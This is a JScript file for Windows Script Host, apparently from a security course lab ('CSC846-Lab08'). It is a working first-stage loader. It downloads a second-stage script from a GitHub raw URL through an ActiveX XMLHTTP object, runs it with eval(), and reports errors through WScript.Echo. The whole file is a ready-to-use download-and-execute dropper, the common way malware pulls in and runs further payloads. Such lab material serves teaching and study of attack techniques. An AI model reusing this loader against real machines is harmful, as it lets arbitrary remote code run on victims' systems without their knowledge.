// write_debug: Used to show debugging output.
function write_debug(str_to_write) {
    if(debug) { // Switch is below
        try{
            //console.log(str_to_write); // In IE, console only works if devtools is open.
            WScript.Echo(str_to_write); // In IE, console only works if devtools is open.
        } catch(e) {
            try {
                WScript.Echo("Error :" + str_to_write); // A lot of popups but provides information.
            } catch(e) {
                // Otherwise, nothing.
            }
        }
    }
}

var debug = true; // Whether write_debug will do anything.
var remoteUrl = "https://raw.githubusercontent.com/kwafula/kwafula.github.io/refs/heads/main/CSC846-Lab08/remote_stage2.js"; // Replace with your actual URL

try {
    // Stage 2 Step 1: Download the script content
    var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"); //Alternative// var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", remoteUrl, false); // Synchronous request
    xhr.send();
    if (xhr.status === 200) {
        var stage2Content = xhr.responseText; //write_debug("stage1Content: " + stage1Content);
        //Stage 2 Step 2: execute remote content
        try {
            eval(stage2Content);
        } catch(e) {
            write_debug("REMOTE CONTENT EVAL ERROR DETAILS:");
            write_debug("An error code: " + e.number);
            write_debug("An error message: " + e.message);
            write_debug("An error description: " + e.description);
        }
        write_debug("Script executed stage 2 successfully.");
    } else {
        write_debug("Failed to download script. Status: " + xhr.status);
    }
} catch (e) {
    write_debug("HTTP GET ERROR DETAILS:");
    write_debug("An error code: " + e.number);
    write_debug("An error message: " + e.message);
    write_debug("An error description: " + e.description);
}
